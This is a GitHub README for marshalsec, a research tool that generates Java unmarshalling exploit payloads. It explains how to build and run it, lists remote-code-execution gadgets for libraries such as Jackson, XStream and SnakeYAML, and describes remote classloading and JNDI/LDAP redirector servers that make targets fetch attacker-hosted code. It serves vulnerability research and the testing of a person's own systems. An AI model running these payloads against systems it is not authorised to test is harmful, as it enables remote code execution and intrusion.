
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmbechler%2Fmarshalsec)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmbechler%2Fmarshalsec)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=mbechler%2Fmarshalsec)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mbechler](/mbechler)
/
**[marshalsec](/mbechler/marshalsec)**
Public

* [Notifications](/login?return_to=%2Fmbechler%2Fmarshalsec) You must be signed in to change notification settings
* [Fork
  684](/login?return_to=%2Fmbechler%2Fmarshalsec)
* [Star
   3.4k](/login?return_to=%2Fmbechler%2Fmarshalsec)

### License

[MIT license](/mbechler/marshalsec/blob/master/LICENSE.txt)

[3.4k
stars](/mbechler/marshalsec/stargazers) [684
forks](/mbechler/marshalsec/forks) [Branches](/mbechler/marshalsec/branches) [Tags](/mbechler/marshalsec/tags) [Activity](/mbechler/marshalsec/activity)
 [Star](/login?return_to=%2Fmbechler%2Fmarshalsec)

 [Notifications](/login?return_to=%2Fmbechler%2Fmarshalsec) You must be signed in to change notification settings

* [Code](/mbechler/marshalsec)
* [Issues
  4](/mbechler/marshalsec/issues)
* [Pull requests
  0](/mbechler/marshalsec/pulls)
* [Actions](/mbechler/marshalsec/actions)
* [Projects
  0](/mbechler/marshalsec/projects)
* [Security](/mbechler/marshalsec/security)
* [Insights](/mbechler/marshalsec/pulse)

Additional navigation options

* [Code](/mbechler/marshalsec)
* [Issues](/mbechler/marshalsec/issues)
* [Pull requests](/mbechler/marshalsec/pulls)
* [Actions](/mbechler/marshalsec/actions)
* [Projects](/mbechler/marshalsec/projects)
* [Security](/mbechler/marshalsec/security)
* [Insights](/mbechler/marshalsec/pulse)

# mbechler/marshalsec

    master[Branches](/mbechler/marshalsec/branches)[Tags](/mbechler/marshalsec/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[23 Commits](/mbechler/marshalsec/commits/master/) | | |
| [src](/mbechler/marshalsec/tree/master/src "src") | | [src](/mbechler/marshalsec/tree/master/src "src") |  |  |
| [.gitignore](/mbechler/marshalsec/blob/master/.gitignore ".gitignore") | | [.gitignore](/mbechler/marshalsec/blob/master/.gitignore ".gitignore") |  |  |
| [LICENSE.txt](/mbechler/marshalsec/blob/master/LICENSE.txt "LICENSE.txt") | | [LICENSE.txt](/mbechler/marshalsec/blob/master/LICENSE.txt "LICENSE.txt") |  |  |
| [README.md](/mbechler/marshalsec/blob/master/README.md "README.md") | | [README.md](/mbechler/marshalsec/blob/master/README.md "README.md") |  |  |
| [marshalsec.pdf](/mbechler/marshalsec/blob/master/marshalsec.pdf "marshalsec.pdf") | | [marshalsec.pdf](/mbechler/marshalsec/blob/master/marshalsec.pdf "marshalsec.pdf") |  |  |
| [pom.xml](/mbechler/marshalsec/blob/master/pom.xml "pom.xml") | | [pom.xml](/mbechler/marshalsec/blob/master/pom.xml "pom.xml") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# Java Unmarshaller Security - Turning your data into code execution

If you came here for Log4Shell/CVE-2021-44228, you may want to read about
the exploitation vectors and affected Java runtime versions:
<https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/>

## Paper

It's been more than two years since Chris Frohoff and Garbriel Lawrence have presented their research into Java object deserialization vulnerabilities ultimately resulting in what can be readily described as the biggest wave of remote code execution bugs in Java history.

Research into that matter indicated that these vulnerabilities are not exclusive to mechanisms as expressive as Java serialization or XStream, but some could possibly be applied to other mechanisms as well.

This paper presents an analysis, including exploitation details, of various Java open-source marshalling libraries that allow(ed) for unmarshalling of arbitrary, attacker supplied, types and shows that no matter how this process is performed and what implicit constraints are in place it is prone to similar exploitation techniques.

Full paper is at [marshalsec.pdf](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)

## Disclaimer

All information and code is provided solely for educational purposes and/or testing your own systems for these vulnerabilities.

## Usage

Java 8 required. Build using maven `mvn clean package -DskipTests`. Run as

```
java -cp target/marshalsec-[VERSION]-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
```

where

* **-a** - generates/tests all payloads for that marshaller
* **-t** - runs in test mode, unmarshalling the generated payloads after generating them.
* **-v** - verbose mode, e.g. also shows the generated payload in test mode.
* **gadget\_type** - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
* **arguments** - Gadget specific arguments

Payload generators for the following marshallers are included:

| Marshaller | Gadget Impact |
| --- | --- |
| BlazeDSAMF(0|3|X) | JDK only escalation to Java serializationvarious third party libraries RCEs |
| Hessian|Burlap | various third party RCEs |
| Castor | dependency library RCE |
| Jackson | **possible JDK only RCE**, various third party RCEs |
| Java | yet another third party RCE |
| JsonIO | **JDK only RCE** |
| JYAML | **JDK only RCE** |
| Kryo | third party RCEs |
| KryoAltStrategy | **JDK only RCE** |
| Red5AMF(0|3) | **JDK only RCE** |
| SnakeYAML | **JDK only RCEs** |
| XStream | **JDK only RCEs** |
| YAMLBeans | third party RCE |

## Arguments and additional prerequisites

### System Command Execution

* **cmd** - command to execute
* **args...** - additional parameters passed as arguments

No prerequisites.

### Remote Classloading (plain)

* **codebase** - URL to remote codebase
* **class** - Class to load

**Prerequisites**:

* Set up a webserver hosting a Java classpath under some path.
* Compiled class files to load need to be served according to Java classpath conventions.

### Remote Classloading (ServiceLoader)

* **service\_codebase** - URL to remote codebase

The service to load is currently hardcoded to *javax.script.ScriptEngineFactory*.

**Prerequisites**:

* Same as plain remote classloading.
* Also needs a provider-configuration file at /META-INF/javax.script.ScriptEngineFactory
  containing the targeted class name in plain text.
* Target class specified there needs to implement the service interface *javax.script.ScriptEngineFactory*.

### JNDI Reference indirection

* **jndiUrl** - JNDI URL to trigger lookup on

**Prerequisites**:

* Set up a remote codebase, same as remote classloading.
* Run a JNDI reference redirector service pointing to that codebase -
  two implementations are included: *marshalsec.jndi.LDAPRefServer* and *RMIRefServer*.
  ```
  java -cp target/marshalsec-[VERSION]-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]
  ```
* Use (ldap|rmi)://*host*:*port*/obj as the *jndiUrl*, pointing to that service's listening address.

## Running tests

There are a couple of system properties that control the arguments when running tests (through maven or when using **-a**)

* **exploit.codebase**, defaults to *<http://localhost:8080/>*
* **exploit.codebaseClass**, defaults to *Exploit*
* **exploit.jndiUrl**, defaults to *ldap://localhost:1389/obj*
* **exploit.exec**, defaults to */usr/bin/gedit*

Tests run with a SecurityManager installed that checks for system command execution as well as code executing from remote codebases.
For that to work the loaded class in use must trigger some security manager check.

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/mbechler/marshalsec/activity)
### Stars

[**3.4k**
stars](/mbechler/marshalsec/stargazers)
### Watchers

[**66**
watching](/mbechler/marshalsec/watchers)
### Forks

[**684**
forks](/mbechler/marshalsec/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmbechler%2Fmarshalsec&report=mbechler+%28user%29)

## [Releases](/mbechler/marshalsec/releases)

No releases published

## [Packages 0](/users/mbechler/packages?repo_name=marshalsec)

No packages published

## [Contributors 6](/mbechler/marshalsec/graphs/contributors)

## Languages

* [Java
  100.0%](/mbechler/marshalsec/search?l=java)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

